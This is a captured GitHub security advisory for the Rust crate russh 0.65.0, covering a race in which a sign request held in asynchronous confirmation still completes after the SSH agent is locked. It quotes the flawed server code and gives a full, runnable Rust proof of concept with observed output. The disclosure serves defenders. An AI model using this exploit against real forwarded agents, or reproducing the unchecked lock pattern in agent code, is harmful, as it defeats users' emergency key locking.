# GHSA-736f-c93q-9fwx: russh try_sign: asynchronous confirmation can sign after agent lock

| Field | Value |
| --- | --- |
| Ecosystem | Rust (crates.io) |
| GHSA | GHSA-736f-c93q-9fwx |
| CVE | CVE-2026-128088 |
| Severity | low |
| CWE | CWE-367, CWE-863 |
| Published | 2026-11-13T19:10:46Z |
| Updated | 2026-11-13T19:10:47Z |
| Affected | russh = 0.65.0 (patched: ) |
| Advisory URL | https://github.com/advisories/GHSA-736f-c93q-9fwx |
| Captured | 2026-11-14 (WAT), daily update |

## Description (verbatim)

### Summary

In russh `0.65.0`, a sign request for a confirmation-constrained key can retain
and use the private key after another connection locks the agent. `try_sign()`
snapshots an `Arc<PrivateKey>` before awaiting `Agent::confirm()` and does not
revalidate the shared lock state after the await. An agent-forwarding peer can
therefore obtain a signature while the agent is locked and every new request is
being rejected.

### Details

The agent's lock and key stores are shared by all connections. `respond()` reads
the lock state once, then dispatches a sign request:

```rust
let is_locked = {
    // ... read the shared lock ...
};

// ...
Some((&13, mut r))
    if !is_locked && agentref.confirm_request(MessageType::Sign).await =>
{
    let agent = self.agent.take().ok_or(Error::AgentFailure)?;
    let (agent, signed) = self.try_sign(agent, &mut r, writebuf).await?;
```

In `try_sign()`, russh clones the private key from the shared store and drops the
store lock before awaiting the asynchronous confirmation callback:

```rust
let key = {
    let blob = Bytes::decode(r)?;
    let k = self.keys.0.read().or(Err(Error::AgentFailure))?;
    if let Some((key, _, constraints)) = k.get(&blob.to_vec()) {
        if constraints.contains(&Constraint::Confirm) {
            needs_confirm = true;
        }
        key.clone()
    } else {
        return Ok((agent, false));
    }
};

let agent = if needs_confirm {
    let (agent, ok) = agent.confirm(key.clone()).await;
    if !ok {
        return Ok((agent, false));
    }
    agent
} else {
    agent
};

// No lock/key-state revalidation occurs here.
sign_with_hash_alg(&PrivateKeyWithHashAlg::new(key, hash_alg), &data)?
    .encode(writebuf)?;
```

While `confirm()` is pending, a second agent connection can successfully lock
the shared agent. When confirmation later returns `true`, the original
connection signs with its captured `Arc<PrivateKey>`.

The affected code is in
[`russh/src/keys/agent/server.rs`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L128-L162)
and
[`try_sign()`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L330-L375).

RFC 9987 section 5.7 requires a locked agent to suspend private-key signature
operations until it is unlocked. A fresh request is correctly rejected while
locked; only the request suspended across the await bypasses the lock.

The vulnerable asynchronous call was introduced by commit `62db6e7` as the fix
for GHSA-vp5q-ff62-jwqv. The behavior is present in released version `0.65.0`
and current commit `183a22e8f8f490fa09b6eb7bd044ef99d8c4414f`.

### Expected behavior

After the agent reports a successful lock, no private-key signature operation
should complete until a successful unlock.

### Actual behavior

A request that reached `Agent::confirm()` before the state transition signs
afterward. New requests made in the same locked or expired state fail, confirming
that the shared state transition took effect.

### Proof of concept

The PoC is self-contained and uses in-memory duplex streams; it does not require
an SSH server, Unix socket, or attached binary file. With a current stable Rust
toolchain installed, create a new directory:

```sh
mkdir -p russh-agent-lock-toctou-poc/src
cd russh-agent-lock-toctou-poc
```

Create `Cargo.toml`:

```toml
[package]
name = "russh-agent-lock-toctou-poc"
version = "0.1.0"
edition = "2024"

[dependencies]
futures = "0.3"
rand = { version = "0.10", features = ["thread_rng"] }
russh = "=0.65.0"
tokio = { version = "1", features = ["macros", "rt-multi-thread", "sync"] }
tokio-stream = "0.1"
```

Create `src/main.rs`:

```rust
use std::{future::Future, sync::Arc};

use russh::keys::agent::{
    Constraint,
    client::AgentClient,
    server::{self, Agent},
};
use russh::keys::{Algorithm, PrivateKey};
use tokio::{
    io::DuplexStream,
    sync::{Notify, mpsc},
};
use tokio_stream::wrappers::ReceiverStream;

#[derive(Clone)]
struct DelayedConfirm {
    entered: Arc<Notify>,
    release: Arc<Notify>,
}

impl Agent for DelayedConfirm {
    fn confirm(
        self,
        _key: Arc<PrivateKey>,
    ) -> Box<dyn Future<Output = (Self, bool)> + Unpin + Send> {
        Box::new(Box::pin(async move {
            self.entered.notify_one();
            self.release.notified().await;
            (self, true)
        }))
    }
}

async fn connect(
    sender: &mpsc::Sender<std::io::Result<DuplexStream>>,
) -> AgentClient<DuplexStream> {
    let (server_stream, client_stream) = tokio::io::duplex(1024 * 1024);
    sender.send(Ok(server_stream)).await.unwrap();
    AgentClient::connect(client_stream)
}

#[tokio::main]
async fn main() {
    let entered = Arc::new(Notify::new());
    let release = Arc::new(Notify::new());
    let agent = DelayedConfirm {
        entered: entered.clone(),
        release: release.clone(),
    };

    let (sender, receiver) = mpsc::channel(4);
    tokio::spawn(async move {
        server::serve::<DuplexStream, _, _>(ReceiverStream::new(receiver), agent)
            .await
            .unwrap();
    });

    let key = PrivateKey::random(&mut rand::rng(), Algorithm::Ed25519).unwrap();
    let public_key = key.public_key().clone();

    let mut administrator = connect(&sender).await;
    administrator
        .add_identity(&key, &[Constraint::Confirm])
        .await
        .unwrap();

    let mut attacker = connect(&sender).await;
    let attacker_key = public_key.clone();
    let pending_sign = tokio::spawn(async move {
        attacker
            .sign_request_signature(&attacker_key, None, b"attacker-controlled request")
            .await
    });

    entered.notified().await;
    administrator.lock(b"lock-password").await.unwrap();
    println!("agent locked while confirmation was pending");

    // Control: a request started after the lock is rejected.
    let mut control = connect(&sender).await;
    let control_result = control
        .sign_request_signature(&public_key, None, b"post-lock request")
        .await;
    println!("new post-lock request accepted: {}", control_result.is_ok());

    // The original request signs after the lock has taken effect.
    release.notify_one();
    let pending_result = pending_sign.await.unwrap();
    println!(
        "pre-lock request signed after lock: {}",
        pending_result.is_ok()
    );

    assert!(control_result.is_err());
    assert!(pending_result.is_ok());
}
```

Run:

```sh
cargo run --quiet
```

Observed on russh `0.65.0` with Rust `1.91.0`:

```text
agent locked while confirmation was pending
new post-lock request accepted: false
pre-lock request signed after lock: true
```

### Impact

russh-based SSH agents that implement asynchronous confirmation are affected,
including agents exposed to remote SSH servers through agent forwarding. A peer
can begin a signature request while the agent is unlocked and hold it in the
confirmation phase. If the agent is subsequently locked, approving or otherwise
completing the stale confirmation still gives the peer a signature that the
agent's current state rejects for every new request.

This weakens emergency locking. The attacker does not recover private key
material, and exploitation requires a sign request to be pending across the
state transition and its confirmation callback eventually to return `true`.

## Related

- [RFC 9987 section 5.7: Locking and Unlocking an Agent](https://www.rfc-editor.org/rfc/rfc9987.html#section-5.7)
- [GHSA-vp5q-ff62-jwqv / CVE-2026-116794: missing confirmation enforcement](https://github.com/advisories/GHSA-vp5q-ff62-jwqv)
- [Commit `62db6e7`: call `Agent::confirm`](https://github.com/Eugeny/russh/commit/62db6e7defd6d244159da962ccccb029e785ce0f)
- [Affected `respond()` implementation at `v0.65.0`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L128-L162)
- [Affected `try_sign()` implementation at `v0.65.0`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L330-L375)

## References

- https://github.com/Eugeny/russh/security/advisories/GHSA-736f-c93q-9fwx
- https://github.com/Eugeny/russh/pull/808
- https://github.com/Eugeny/russh/commit/43a46d67a80a7355fcd2fb25e7e00d79aec8184c
- https://github.com/Eugeny/russh/releases/tag/v0.65.1
- https://github.com/advisories/GHSA-736f-c93q-9fwx
